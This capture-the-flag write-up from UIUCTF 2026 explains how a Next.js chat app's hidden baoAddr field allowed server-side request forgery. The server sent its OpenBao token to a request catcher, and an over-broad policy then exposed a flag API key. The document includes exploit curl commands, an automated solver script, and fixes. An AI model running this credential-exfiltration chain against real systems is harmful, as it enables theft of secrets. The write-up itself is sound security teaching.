---
title: 'UIUCTF 2026: Nabi AI'
description: 'A Next.js chat application leaked its OpenBao token through a deprecated, client-controllable baoAddr field, turning an AI challenge into a conventional SSRF and secrets-management failure.'
event: 'UIUCTF 2026'
category: 'web'
difficulty: 'medium'
date: 2026-07-09
tags:
  - ssrf
  - openbao
  - secrets-management
  - nextjs
  - server-actions
  - source-maps
draft: false
---

<!-- The final flag is hidden behind a details toggle, consistent with the other writeups here. -->
<!-- All instance identifiers, request-catcher IDs, tokens, and API keys are placeholders. Authorized competition practice only. -->

## Challenge overview

**Event:** UIUCTF 2026 · **Category:** Web · **Points:** 68 · **Challenge author:** `Cameron`

Solved by Derek Wei for team idktheflag. I primarily worked on web challenges for the team.

Nabi AI presented a chat application with a helpful assistant. The obvious reading was that this would be a prompt-injection challenge: talk the model into revealing something it should not.

That reading was wrong, and recognizing it early is what made the challenge tractable.

## Summary

Nabi AI was not fundamentally a prompt-injection challenge. The exploitable vulnerability was a conventional web-security and secrets-management failure that happened to sit behind a chat interface.

The deployment had three services: the Nabi AI chat application, an OpenBao instance holding its secrets, and a Flag Service that returned the flag to anyone presenting the right API key.

The chat application's Server Action accepted a hidden, development-era `baoAddr` property. That property controlled the base address of an authenticated request the backend made to OpenBao, and the backend forwarded its privileged `X-Vault-Token` header to whatever address the client chose. Pointing `baoAddr` at a request catcher disclosed the application's OpenBao token.

The token's policy was broader than the application needed. It permitted reads across `secret/data/+`, which covered the flag secret as well as the application's own. That secret held `FLAG_API_KEY`, which authenticated to the Flag Service.

The model's refusal behavior was never a security boundary. The flaw sat below the model layer entirely.

## Architecture

Three services, each on its own hostname. Instance identifiers are replaced with a placeholder throughout:

```text
https://INSTANCE-nabi-ai.chal.uiuc.tf
https://INSTANCE-openbao-nabi-ai.chal.uiuc.tf
https://INSTANCE-flag-service-nabi-ai.chal.uiuc.tf
```

OpenBao ran a KV version 2 secrets engine holding two secrets:

```text
secret/data/nabi
secret/data/flag
```

The application's token carried this policy:

```hcl
path "secret/data/+" {
  capabilities = ["read"]
}
```

The `+` wildcard matches exactly one path segment. That means the policy permitted reading any single-segment secret beneath `secret/data/`, so it covered `nabi`, which the application legitimately needed, and `flag`, which it did not. This is the second half of the vulnerability: even after the token leaked, a correctly scoped policy would have limited the damage to the application's own secret.

## Initial reconnaissance

OpenBao answered its health endpoint, confirming a live and usable instance:

```bash
BAO='https://INSTANCE-openbao-nabi-ai.chal.uiuc.tf'
curl -skS "$BAO/v1/sys/health" | jq .
```

The response showed the instance initialized and unsealed. Requesting the root path returned `404`, which is expected for OpenBao and is not itself a finding.

Reading the flag secret anonymously failed, as it should:

```bash
curl -skS "$BAO/v1/secret/data/flag" | jq .
```

```json
{
  "errors": ["permission denied"]
}
```

The Flag Service was equally direct about what it wanted:

```bash
curl -skS 'https://INSTANCE-flag-service-nabi-ai.chal.uiuc.tf/'
```

It returned an error stating that the `x-api-token` header was required. That framed the challenge cleanly: find a credential that OpenBao will accept, read the flag secret, and present the key it contains to the Flag Service.

## Finding the Server Action

There was no `/api/chat` endpoint. Watching the network panel while sending a chat message showed a POST back to the page itself, carrying a Next.js Server Action identifier:

```text
407e153d5824829d199a24b87d41748243b5d2fdf3
```

The request headers marked it as a Server Action rather than a normal form post:

```http
Accept: text/x-component
Content-Type: text/plain;charset=UTF-8
Next-Action: 407e153d5824829d199a24b87d41748243b5d2fdf3
```

The body was a JSON array holding the action's arguments:

```json
[
  {
    "conversationId": "$undefined",
    "content": "hello"
  }
]
```

The response came back in the React Server Component transport format rather than as plain JSON, which is why it does not resemble a conventional API response.

The important property of a Server Action is that the argument object is deserialized on the server. The client sends whatever shape it likes, and the server receives the whole object. The user interface only ever populated two fields, but nothing about the transport limited it to two.

## Recovering the source maps

The compiled bundles ended with source map directives:

```text
//# sourceMappingURL=1aetd-kcz3znh.js.map
```

Those maps were publicly retrievable from the Next.js static chunk directory, and they included both the original filenames and the original source content. Recovering them turned minified bundle output back into readable TypeScript. Files that mattered:

```text
app/page.tsx
app/_actions/chat.ts
app/_types/chat.ts
app/_components/chat-composer.tsx
```

Worth being precise about this: the public source maps made the flaw easy to find, but they were not the vulnerability. The same bug would have existed with the maps removed. It would simply have taken longer to locate.

## The deprecated field

`app/_types/chat.ts` held the request type for the chat action. This is a normalized excerpt: the recovered comment is reproduced for meaning, with formatting cleaned up, rather than as a character-exact quotation.

```typescript
export type SendMessageRequest = {
  conversationId?: string;
  content: string;

  /**
   * @deprecated
   * Left in for backwards compatibility.
   * Used in development to set the OpenBao URL.
   */
  baoAddr?: string;
};
```

The comment says exactly what it does. Someone needed to point a local build at a local OpenBao, added a field to do it, marked it deprecated, and shipped it.

Four things had to be true at once for this to be exploitable, and they all were:

- The normal interface never supplied `baoAddr`, so nothing in the visible application hinted at it.
- The Server Action accepted the complete request object regardless, because that is how Server Action arguments deserialize.
- A client could add the field by hand.
- The server treated the supplied value as the OpenBao base address, and still attached its own credential to the outbound request.

## Root cause

The vulnerability is a combination of four failures, not one:

1. **Server-Side Request Forgery.** A client-controlled value determined the destination of a server-side request.
2. **Credential forwarding to an untrusted origin.** The privileged `X-Vault-Token` was attached to a request whose destination the client had chosen.
3. **Excessive OpenBao permissions.** The token could read every single-segment secret, not just the application's.
4. **A development-only input surviving into production.** The field was marked deprecated, but marking something deprecated does not remove it.

Conceptually the backend did this. It is pseudocode illustrating the shape of the bug, not a verbatim reproduction of the recovered source:

```typescript
const baoAddress =
  request.baoAddr ?? process.env.OPENBAO_ADDR;

await fetch(`${baoAddress}/v1/secret/data/nabi`, {
  headers: {
    'X-Vault-Token': process.env.OPENBAO_APP_TOKEN,
  },
});
```

Any one of the four failures alone would have been survivable. The SSRF alone leaks nothing if no credential rides along. The credential forwarding is harmless if the destination cannot be influenced. The broad policy costs nothing if the token never leaves the server. Together they form a complete path from an unauthenticated chat message to the flag.

## Exploitation

### Stage A: stand up a request catcher

Any server that logs inbound requests and their headers works. I used a hosted request catcher, referred to here by placeholder:

```text
https://webhook.site/WEBHOOK_ID
```

### Stage B: supply `baoAddr`

The request is the ordinary chat action with one extra property in the argument object:

```bash
NABI='https://INSTANCE-nabi-ai.chal.uiuc.tf/'
ACTION='407e153d5824829d199a24b87d41748243b5d2fdf3'
HOOK='https://webhook.site/WEBHOOK_ID'

jq -nc \
  --arg hook "$HOOK" \
  '[{
    "conversationId":"$undefined",
    "content":"hello",
    "baoAddr":$hook
  }]' |
curl -skS "$NABI" \
  -H 'accept: text/x-component' \
  -H 'content-type: text/plain;charset=UTF-8' \
  -H "next-action: $ACTION" \
  --data-binary @-
```

Building the body with `jq` rather than pasting a quoted string avoids a class of problem described under dead ends below.

### Stage C: capture the token

The request catcher received an inbound request from the application, with the OpenBao path appended to the base address it had been given:

```text
/WEBHOOK_ID/v1/secret/data/nabi
```

The headers on that request included the application's credential:

```http
X-Vault-Token: REDACTED
```

That is the whole vulnerability in one line. The application authenticated to a server chosen by the person sending the chat message.

### Stage D: read the flag secret

The captured token goes to the real OpenBao instance. Reading the token with `read -rs` keeps it out of shell history:

```bash
read -rsp 'OpenBao token: ' BAO_TOKEN
echo

BAO='https://INSTANCE-openbao-nabi-ai.chal.uiuc.tf'

curl -skS \
  -H "X-Vault-Token: $BAO_TOKEN" \
  "$BAO/v1/secret/data/flag" |
tee /tmp/flag-secret.json |
jq .
```

The policy that permitted `secret/data/+` allowed this read. KV version 2 nests the payload one level deeper than version 1, which matters for the extraction step:

```json
{
  "data": {
    "data": {
      "FLAG_API_KEY": "REDACTED"
    }
  }
}
```

### Stage E: call the Flag Service

```bash
FLAG_API_KEY=$(
  jq -r '.data.data.FLAG_API_KEY' \
    /tmp/flag-secret.json
)

FLAG_SERVICE='https://INSTANCE-flag-service-nabi-ai.chal.uiuc.tf/'

curl -skS \
  -H "x-api-token: $FLAG_API_KEY" \
  "$FLAG_SERVICE"
```

The Flag Service accepted the key and returned the flag.

<details>
<summary><strong>Spoiler: show the final flag</strong></summary>
<pre><code>uiuctf{lets_just_go_back_to_a_monolith_983c1ec97484}</code></pre>
</details>

Clear the credentials out of the shell afterwards:

```bash
unset BAO_TOKEN
unset FLAG_API_KEY
rm -f /tmp/flag-secret.json
```

## Sanitized solver

The full chain, with every sensitive value replaced by a placeholder or read at runtime. It will not run as-is: the instance identifier, the request-catcher ID, and the catcher's API key have to be filled in.

```bash
#!/usr/bin/env bash
# UIUCTF 2026 - Nabi AI
# Sanitized. Fill in the placeholders before running.
set -euo pipefail

INSTANCE='INSTANCE'                 # challenge instance identifier
WEBHOOK_ID='WEBHOOK_ID'             # request-catcher ID
WEBHOOK_API_KEY='WEBHOOK_API_KEY'   # request-catcher API key, for polling

NABI="https://${INSTANCE}-nabi-ai.chal.uiuc.tf/"
BAO="https://${INSTANCE}-openbao-nabi-ai.chal.uiuc.tf"
FLAG_SERVICE="https://${INSTANCE}-flag-service-nabi-ai.chal.uiuc.tf/"
HOOK="https://webhook.site/${WEBHOOK_ID}"
ACTION='407e153d5824829d199a24b87d41748243b5d2fdf3'

echo '[*] Checking OpenBao health'
curl -skS "${BAO}/v1/sys/health" | jq '{initialized, sealed}'

echo '[*] Triggering the chat action with a client-supplied baoAddr'
jq -nc --arg hook "$HOOK" \
  '[{"conversationId":"$undefined","content":"hello","baoAddr":$hook}]' |
curl -skS "$NABI" \
  -H 'accept: text/x-component' \
  -H 'content-type: text/plain;charset=UTF-8' \
  -H "next-action: ${ACTION}" \
  --data-binary @- >/dev/null

echo '[*] Polling the request catcher for the forwarded token'
BAO_TOKEN=''
for _ in $(seq 1 20); do
  BAO_TOKEN=$(
    curl -skS \
      -H "Api-Key: ${WEBHOOK_API_KEY}" \
      "https://webhook.site/token/${WEBHOOK_ID}/requests?sorting=newest" |
    jq -r '[.data[].headers["x-vault-token"][0]?] | map(select(. != null)) | first // empty'
  )
  [ -n "$BAO_TOKEN" ] && break
  sleep 2
done

if [ -z "$BAO_TOKEN" ]; then
  echo '[!] No X-Vault-Token captured' >&2
  exit 1
fi
echo '[+] Token captured'

echo '[*] Reading secret/data/flag'
FLAG_API_KEY=$(
  curl -skS -H "X-Vault-Token: ${BAO_TOKEN}" \
    "${BAO}/v1/secret/data/flag" |
  jq -r '.data.data.FLAG_API_KEY'
)

echo '[*] Calling the Flag Service'
curl -skS -H "x-api-token: ${FLAG_API_KEY}" "$FLAG_SERVICE"
echo

unset BAO_TOKEN FLAG_API_KEY
```

## Dead ends

### Asking the model directly

The first thing I tried was simply asking Nabi for the protected secret. It declined:

```text
Sorry, I can't assist with that.
```

That refusal was well-behaved and completely irrelevant. The flaw was in the request the backend made on the user's behalf, not in what the model was willing to say. Time spent trying to talk the model into cooperating would have been time wasted.

### Searching only for `/api/`

Grepping the bundles for conventional REST paths produced nothing useful, because the application had no such route. Server Actions post back to the page and identify themselves with the `Next-Action` header instead. Assuming a REST shape delayed finding the real entry point.

### Framework noise

Searching the minified bundles for `fetch`, `URL`, `source`, and similar terms returned mostly React, Next.js, and polyfill code. The signal-to-noise ratio was poor enough to be actively misleading. Recovering the source maps solved this by separating a handful of application files from the framework bulk, which is what turned a search problem into a reading problem.

### Corrupted commands

One practical note: pasting commands out of a formatted chat interface can corrupt them, typically by converting quotes or injecting HTML entities and anchors. After one silently mangled request, I kept commands short, built JSON bodies with `jq` instead of hand-quoting them, and checked each command before running it.

## Security impact

The pattern here, a server attaching its own credential to a request whose destination a user controls, is not specific to CTFs or to AI applications. In a production system the equivalent bug can disclose whatever the leaked credential can reach.

Depending on what the compromised token is scoped to, that could include database passwords, cloud provider credentials, third-party API keys, service authentication tokens, signing secrets, deployment credentials, or encryption material. None of those existed in this challenge; they are examples of what an equivalent production failure could expose.

The severity is set by the token's policy, which is exactly why the fourth item on the fix list matters as much as the first.

## Recommended fixes

1. Remove `baoAddr` from any client-controlled request type. A deprecation comment is documentation, not a control.
2. Configure the OpenBao address only through trusted server-side configuration.
3. Never attach credentials to a request whose origin a client selected.
4. If a destination genuinely must be selectable, validate it against an exact allowlist of permitted origins, not a prefix or pattern match.
5. Restrict outbound network access from the application so it can reach only the hosts it needs.
6. Apply least privilege to the OpenBao token.
7. Replace the wildcard policy:

```hcl
path "secret/data/+" {
  capabilities = ["read"]
}
```

with one scoped to the secret the application actually reads:

```hcl
path "secret/data/nabi" {
  capabilities = ["read"]
}
```

8. Remove development-only compatibility fields before production deployment.
9. Keep production source maps private unless they are deliberately published.
10. Revoke and rotate any credential suspected of having been forwarded to an unintended destination.

To be clear about the ordering: hiding the source maps would not have fixed anything. It would have made the field harder to discover while leaving it fully exploitable. Items 1 through 6 are the fix; item 9 reduces discoverability.

## Key takeaway

The trust boundary failed in one specific place, and everything downstream followed from it:

```text
Untrusted client input
        |
        v
Client-controlled baoAddr
        |
        v
Authenticated server-side request
        |
        v
X-Vault-Token sent to attacker-controlled origin
        |
        v
Token reused against real OpenBao
        |
        v
secret/data/flag
        |
        v
FLAG_API_KEY
        |
        v
Flag Service
```

The model refused every direct request and it made no difference. An AI feature sitting in front of a backend does not change what that backend needs: server-side configuration that clients cannot influence, credentials that are never attached to client-selected destinations, least-privilege scoping so a leaked token is worth as little as possible, and outbound restrictions so a forged request has nowhere useful to go.

The flag is behind the spoiler under [Stage E](#stage-e-call-the-flag-service).
